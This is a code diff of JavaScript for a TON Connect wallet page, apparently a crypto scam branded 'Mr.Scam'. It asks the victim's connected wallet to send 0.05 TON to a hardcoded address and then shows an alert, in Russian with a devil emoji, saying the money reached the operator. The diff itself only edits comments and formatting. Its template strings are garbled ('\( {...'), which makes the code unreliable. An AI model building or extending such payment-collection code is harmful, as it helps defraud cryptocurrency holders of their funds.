@@ -14,7 +14,7 @@ const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
   manifestUrl: 'https://mr-scam.vercel.app/tonconnect-manifest.json',
   buttonRootId: 'connect-container',
   actionsConfiguration: {
-    twaReturnUrl: 'https://t.me/ТВОЙ_БОТ_ЮЗЕРНЕЙМ'  // ← Замени на свой бот!
+    twaReturnUrl: 'https://t.me/ТВОЙ_БОТ_ЮЗЕРНЕЙМ'  // ← Замени на юзернейм своего бота!
   }
 });
 
@@ -22,7 +22,9 @@ let connectedWallet = null;
 tonConnectUI.onStatusChange(wallet => {
   if (wallet) {
     connectedWallet = wallet.account.address;
-    document.getElementById('wallet-status').textContent = `Кошелёк подключён: \( {connectedWallet.slice(0,8)}... \){connectedWallet.slice(-6)}`;
+    // Чистый вывод адреса без кода
+    document.getElementById('wallet-status').textContent = 
+      `Кошелёк подключён: \( {connectedWallet.slice(0,8)}... \){connectedWallet.slice(-6)}`;
     document.getElementById('payment-section').style.display = 'block';
   } else {
     connectedWallet = null;
@@ -36,13 +38,13 @@ document.getElementById('payment-btn').onclick = async () => {
     validUntil: Math.floor(Date.now() / 1000) + 600,
     messages: [{
       address: 'UQBpBH_apAYKPChl7V1wfEeZ1JovWFIr2VXfzTVUVQfDXHrZ',
-      amount: '50000000'
+      amount: '50000000' // 0.05 TON
     }]
   };
 
   try {
     await tonConnectUI.sendTransaction(transaction);
-    alert('✅ 0.05 TON успешно внесено в Mr.Scam! Деньги пришли тебе 😈');
+    alert('✅ 0.05 TON успешно внесено в Mr.Scam!\nДеньги пришли тебе 😈');
   } catch (e) {
     alert('❌ Ошибка или отменено');
   }
